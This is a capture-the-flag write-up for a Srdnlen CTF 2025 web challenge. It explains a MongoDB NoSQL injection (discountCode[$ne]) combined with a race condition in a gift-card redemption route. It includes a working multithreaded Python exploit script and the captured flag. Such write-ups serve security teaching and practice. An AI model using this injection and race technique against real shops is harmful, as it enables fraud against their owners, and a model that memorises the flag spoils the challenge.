---
title: "Focus. Speed. I am speed. - Srdnlen CTF 2025 Quals"
category: "web"
subcategory: "nosqli"
type: "writeup"
tags: ["racecondition", "web", "nosql-injection", "race-condition", "mongodb", "nosqli", "srdnlen-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "Opening the URL, the first screen that appears is the following:"
source:
  name: "CTFtime writeup #39826"
  url: "https://ctftime.org/writeup/39826"
ctf:
  name: "Srdnlen CTF 2025 Quals"
  year: 2025
  challenge: "Focus. Speed. I am speed."
---

## Metadata

- **CTF:** Srdnlen CTF 2025 Quals
- **Task:** Focus. Speed. I am speed.
- **Author team:** aetruria
- **CTFtime tags:** racecondition, web, nosql-injection
- **CTFtime:** <https://ctftime.org/writeup/39826>

---
### Challenge Description

> Welcome to Radiator Springs' finest store, where every car enthusiast's dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow! Website: <http://speed.challs.srdnlen.it:8082>

### Initial Analysis

Opening the URL, the first screen that appears is the following:

![site](<https://i.imgur.com/63RrSKH.png>)

After going through the registration and login process, I realized that it is a store, where most likely, you need to purchase the most expensive item in order to read the flag (since the account balance is 0 right after registration):

![store](<https://i.imgur.com/ZZH1WKq.png>)

In fact, as we can see by reading the attached files, specifically in the `app.js` file, the most expensive item contains the flag:

```js  
const products = [  
{ productId: 1, Name: "Lightning McQueen Toy", Description: "Ka-chow! This toy goes as fast as Lightning himself.", Cost: "Free" },  
{ productId: 2, Name: "Mater's Tow Hook", Description: "Need a tow? Mater's here to save the day (with a little dirt on the side).", Cost: "1 Point" },  
{ productId: 3, Name: "Doc Hudson's Racing Tires", Description: "They're not just any tires, they're Doc Hudson's tires. Vintage!", Cost: "2 Points" },  
{   
productId: 4,   
Name: "Lightning McQueen's Secret Text",   
Description: "Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.",   
Cost: "50 Points",   
FLAG: process.env.FLAG || 'SRDNLEN{fake_flag}'   
}  
];  
```

Continuing to read the attached files, the function related to the `/redeem` route in the `routes.js` file immediately caught my attention:

```js  
router.get('/redeem', isAuth, async (req, res) => {  
try {  
const user = await User.findById(req.user.userId);

if (!user) {  
return res.render('error', { Authenticated: true, message: 'User not found' });  
}

// Now handle the DiscountCode (Gift Card)  
let { discountCode } = req.query;  
  
if (!discountCode) {  
return res.render('error', { Authenticated: true, message: 'Discount code is required!' });  
}

const discount = await DiscountCodes.findOne({discountCode})

if (!discount) {  
return res.render('error', { Authenticated: true, message: 'Invalid discount code!' });  
}

// Check if the voucher has already been redeemed today  
const today = new Date();  
const lastRedemption = user.lastVoucherRedemption;

if (lastRedemption) {  
const isSameDay = lastRedemption.getFullYear() === today.getFullYear() &&  
lastRedemption.getMonth() === today.getMonth() &&  
lastRedemption.getDate() === today.getDate();  
if (isSameDay) {  
return res.json({success: false, message: 'You have already redeemed your gift card today!' });  
}  
}

// Apply the gift card value to the user's balance  
const { Balance } = await User.findById(req.user.userId).select('Balance');  
user.Balance = Balance + discount.value;  
// Introduce a slight delay to ensure proper logging of the transaction   
// and prevent potential database write collisions in high-load scenarios.  
new Promise(resolve => setTimeout(resolve, delay * 1000));  
user.lastVoucherRedemption = today;  
await user.save();

return res.json({  
success: true,  
message: 'Gift card redeemed successfully! New Balance: ' + user.Balance // Send success message  
});

} catch (error) {  
console.error('Error during gift card redemption:', error);  
return res.render('error', { Authenticated: true, message: 'Error redeeming gift card'});  
}  
});  
```

As we can notice from this function, it takes a discountCode parameter, which is passed when the request is made. This is where the first vulnerability lies, namely a NoSQL Injection. In fact, as we can see from the following line:

```js  
const discount = await DiscountCodes.findOne({discountCode})  
```

If we pass `discountCode[$ne]=anything` as a parameter, the "condition" of the query will always be true, bypassing the validation check for a valid discount code. In fact, since we are using MongoDB as the database, we can exploit the `$ne` operator, which stands for `not equal`. By entering any invalid discount code (one that is not contained in the database), the condition will always return true. However, as we can see, we can't use the same technique twice, as there is a check for the last redemption of the discount code immediately after. Therefore, we cannot redeem the same discount code more than once per day. However, this check is not very useful, as there is another vulnerability in the code that can be exploited: a race condition. In fact, as we can see from the following lines:

```js  
// Apply the gift card value to the user's balance  
const { Balance } = await User.findById(req.user.userId).select('Balance');  
user.Balance = Balance + discount.value;  
// Introduce a slight delay to ensure proper logging of the transaction   
// and prevent potential database write collisions in high-load scenarios.  
new Promise(resolve => setTimeout(resolve, delay * 1000));  
user.lastVoucherRedemption = today;  
await user.save();  
```

The data update in the database is not immediate, so we can exploit the time when it hasn't been updated yet to make additional valid redemption requests, bypassing all checks and redeeming more points. This is because we need 50 points. Since each time we redeem a discount code, we earn 20 points, we need to redeem 3 codes to be able to purchase the item containing the flag.

### Exploit

We can achieve this with a Python script using multithreading to make simultaneous requests. I may have overdone it with the number of requests in my script, but the important thing is that it worked. The following script, in addition to redeeming the points needed to purchase the item containing the flag, is fully automated. It also handles the login phase and the purchase of the flag, extracting it from the response using BeautifulSoup (bs4).

```python  
import requests  
from faker import Faker  
from bs4 import BeautifulSoup  
import threading

s = []  
snum = 20  
fake = Faker()  
url = "<http://speed.challs.srdnlen.it:8082/>"

data = {  
"username":fake.user_name(),  
"password":fake.password()  
}

## NoSQLInjection  
def req(i):  
s[i].get(url + "redeem?discountCode[$ne]=test")  
  
th = []

## Race Condition  
for i in range(snum):  
s.append(requests.Session())  
  
if i == 0:  
s[i].post(url + "register-user", json=data)  
  
s[i].post(url + "user-login", json=data)  
  
x = threading.Thread(target=req, args=(i,))  
th.append(x)  
  
for i in range(snum):  
th[i].start()  
  
for i in range(snum):  
th[i].join()

## Login   
session = requests.Session()   
[session.post](http://session.post)(url + "user-login", json=data).text

## Flag purchase  
[session.post](http://session.post)(url + "store", json={"productId": 4})

## Flag extraction  
print("\nFLAG: " + BeautifulSoup(session.get(url, timeout=20).text, 'html.parser').find('p', class_='card-text', string=lambda t: t and 'Flag:' in t).get_text().split('Flag: ')[1])

```

### Flag

```  
srdnlen{6peed_1s_My_0nly_Competition}  
```
